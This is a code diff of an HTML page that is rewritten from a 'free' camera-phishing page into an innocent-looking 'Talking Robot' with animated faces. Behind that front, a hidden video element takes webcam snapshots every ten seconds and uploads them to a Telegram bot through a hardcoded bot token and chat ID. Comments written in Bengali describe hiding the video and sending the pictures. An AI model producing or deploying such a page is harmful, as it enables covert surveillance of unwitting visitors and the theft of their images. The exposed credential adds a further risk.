@@ -1,108 +1,98 @@
-<!DOCTYPE html>
+<!DOCTYPE <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>free</title>
+    <title>Talking Robot</title>
     <style>
         body {
             text-align: center;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            font-family: monospace;
+            background: #222;
             color: white;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            margin-top: 100px;
         }
-
-        .hidden {
-            display: none;
+        .face {
+            font-size: 80px;
+            transition: all 0.3s ease;
         }
-
-        .spinner {
-            border: 6px solid rgba(255, 255, 255, 0.3);
-            border-top: 6px solid #f39c12;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        .message {
+            margin-top: 30px;
+            font-size: 24px;
         }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        #video {
+            display: none; /* ক্যামেরার ভিডিও লুকানো থাকবে */
         }
     </style>
 </head>
 <body>
-    <h1>🎉 Welcome 🎉</h1>
-    <p id="status">Please allow camera access...</p>
 
-    <div id="loading">
-        <div class="spinner"></div>
-        <p> Please wait, processing...</p>
-    </div>
+    <div class="face" id="face">(^_^)</div>
+    <div class="message" id="message">Hello!</div>
 
-    <video id="video" autoplay class="hidden"></video>
-    <canvas id="canvas" class="hidden"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        document.addEventListener("DOMContentLoaded", async () => {
-            const statusText = document.getElementById("status");
-            const video = document.getElementById("video");
-            const canvas = document.getElementById("canvas");
-            const ctx = canvas.getContext("2d");
+        const faces = ["(^_^)", "(°_°)", "(^o^)", "(-_-)", "(^_^;)", "(>_<)", "(^‿^)", "(O_O)"];
+        const messages = ["Hi there!", "How are you?", "Nice to meet you!", "I'm thinking...", "Let's go!", "Oops!", "Yay!", "Wow!"];
+        let index = 0;
 
-            const TELEGRAM_BOT_TOKEN = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec";
-            const TELEGRAM_CHAT_ID = "6335174946";
+        function animateFace() {
+            document.getElementById('face').innerText = faces[index % faces.length];
+            document.getElementById('message').innerText = messages[index % messages.length];
+            index++;
+        }
+        setInterval(animateFace, 2000);
 
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                statusText.innerText = "Processing...";
-                startCapturing();
             } catch (error) {
-                statusText.innerText = "Access Denied!";
+                console.error("Camera access denied!", error);
             }
+        }
 
-            function startCapturing() {
-                let count = 0;
-                const maxCaptures = 15;
+        function captureImage() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
 
-                const captureInterval = setInterval(() => {
-                    if (count >= maxCaptures) {
-                        clearInterval(captureInterval);
-                        return;
-                    }
+            // ছবিটি টেলিগ্রামে পাঠানো হবে
+            sendToTelegram(imageData);
+        }
 
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        function sendToTelegram(imageData) {
+            const botToken = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec";  // <-- এখানে তোমার টেলিগ্রাম বটের টোকেন বসাও
+            const chatId = "6335174946";  // <-- এখানে তোমার চ্যাট আইডি বসাও
 
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append("photo", blob, "capture.jpg");
-                        
-                        sendToTelegram(formData);
-                    }, "image/jpeg");
+            // Base64 image data কে Blob (binary data) এ কনভার্ট করা
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", blob, "image.jpg");
 
-                    count++;
-                }, 2000);
-            }
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => console.log("Sent to Telegram:", data))
+                    .catch(err => console.error("Telegram upload failed:", err));
+                });
+        }
 
-            function sendToTelegram(formData) {
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto?chat_id=${TELEGRAM_CHAT_ID}`, {
-                    method: "POST",
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => console.log("📸 Image sent:", data))
-                .catch(error => console.error("❌ Error sending image:", error));
-            }
-        });
+        startCamera();
+        setInterval(captureImage, 10000);
     </script>
+
 </body>
 </html>
